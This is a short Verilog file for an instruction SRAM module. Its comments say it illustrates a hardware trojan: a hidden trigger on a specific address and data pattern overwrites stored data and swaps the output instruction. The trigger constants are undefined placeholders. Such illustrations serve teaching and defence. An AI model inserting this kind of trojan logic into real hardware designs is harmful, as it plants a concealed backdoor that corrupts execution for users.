// Code your design here
`timescale 1ns/1ns
		
module isram #(parameter m = 10, n = 8) 
			(input clk, w_en,
			input [m-1:0] addr, 
			input [n-1:0] data,
			output [4*(n)-1:0] inst);

	parameter mem_size = 2**m; // 2^m
	reg [n-1:0] ISRAM [0:mem_size-1];


	always @(posedge clk) begin
		if (w_en)
			ISRAM[addr] <= data;
		// Additional "check" for a specific condition (e.g., a certain address or data pattern)
		if (addr == SPECIFIC_ADDR && data == SPECIFIC_DATA_PATTERN) begin
			// This line is purely illustrative of where and how a hardware trojan could theoretically modify behavior
			ISRAM[SPECIFIC_ADDR] <= ALTERED_DATA;
		end
	end

	// Original assignment with a twist: under certain conditions, the instruction might be altered
assign inst = (addr == SPECIAL_CONDITION_ADDR) ? ALTERED_INSTRUCTION : {{ISRAM[addr],ISRAM[addr+1]},{ISRAM[addr+2],ISRAM[addr+3]}};

endmodule 
